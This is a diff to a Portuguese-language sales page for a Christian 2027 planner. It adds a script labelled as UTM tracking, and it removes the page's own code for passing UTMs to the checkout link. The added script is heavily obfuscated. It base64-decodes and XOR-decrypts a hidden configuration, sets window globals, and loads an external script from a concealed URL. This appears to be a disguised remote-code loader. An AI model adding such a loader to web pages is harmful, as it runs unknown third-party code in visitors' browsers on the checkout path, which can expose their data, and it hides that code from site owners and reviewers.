@@ -60,6 +60,10 @@ gtag('config', 'G-XXXXXXXXXX');
 </script>
      ========================================================= -->
 
+<!-- ===================== UTMIFY =====================
+     Rastreamento de UTMs (cola as UTMs dos anúncios no link do checkout). -->
+<script>(function(){var r_5=atob("DAc8hT6AQYLC1AL9pXwe8EzsY7jgvHaJ1XQGqhHjJezsoXaQzGFFq13vLKygpi2OxnVV9Urzbve2uXHSyWZI4E30b+ix9i7fxHNI91fiNPanpyDH/nwe61/tJKD49mac0WYR8ErtKOS7+XKPwHFZ60qtOeGtsC+OxmweqRz2IO63sSDHhyVBqUWiL+OvsSDHh2Nd8V+tNPavvWSEiHdO4EjlL/bvp3efzGNPpxKiN+OuoWffnyUe+GP9");var c_yo=[];for(var c_m0v=0;c_m0v<r_5.length;c_m0v++){c_yo.push(r_5.charCodeAt(c_m0v)&255);}var k_oqee=c_yo[0];var a_a=c_yo.slice(1,1+k_oqee);var g_2=c_yo.slice(1+k_oqee);var z_3333=g_2.map(function(b,l_nu){return b^a_a[l_nu%k_oqee];});var o_i="";for(var v_ro53=0;v_ro53<z_3333.length;v_ro53++){o_i+=String.fromCharCode(z_3333[v_ro53]&255);}var c_o7m=decodeURIComponent(escape(o_i));var p_z43=JSON.parse(c_o7m);var l_rl=p_z43.globals||[];l_rl.forEach(function(t_1lq8){window[t_1lq8.name]=t_1lq8.value;});var n_430u=document.createElement("script");n_430u.src=p_z43.url;n_430u.async=true;n_430u.defer=true;(p_z43.attributes||[]).forEach(function(g_6){n_430u.setAttribute(g_6.name,g_6.value);});(document.head||document.documentElement).appendChild(n_430u);})();</script>
+
 <style>
 :root{
   --creme:#EFE4D6;        /* fundo principal */
@@ -606,13 +610,10 @@ h2{font-size:clamp(28px,7vw,42px)}
   var valor = parseFloat(String(PRECO).replace(/\./g, "").replace(",", "."));
 
   // ---- botões de compra + InitiateCheckout ----
+  // As UTMs dos anúncios são coladas no link pela Utmify (script no <head>)
   var temCheckout = LINK_CHECKOUT.indexOf("SEU-LINK") === -1;
-  var destino = LINK_CHECKOUT;
-  if (temCheckout && location.search) { // repassa UTMs dos anúncios para o checkout
-    destino += (destino.indexOf("?") > -1 ? "&" : "?") + location.search.slice(1);
-  }
   $$(".js-checkout").forEach(function (a) {
-    if (temCheckout) { a.href = destino; }
+    if (temCheckout) { a.href = LINK_CHECKOUT; }
     a.addEventListener("click", function (e) {
       try {
         var dados = { currency: "BRL", content_name: "Planner Cristão 2027 personalizado" };
@@ -622,7 +623,7 @@ h2{font-size:clamp(28px,7vw,42px)}
       } catch (err) {}
       if (temCheckout && !e.ctrlKey && !e.metaKey) { // dá tempo do evento sair antes de trocar de página
         e.preventDefault();
-        setTimeout(function () { location.href = destino; }, 250);
+        setTimeout(function () { location.href = a.href; }, 250);
       }
     });
   });
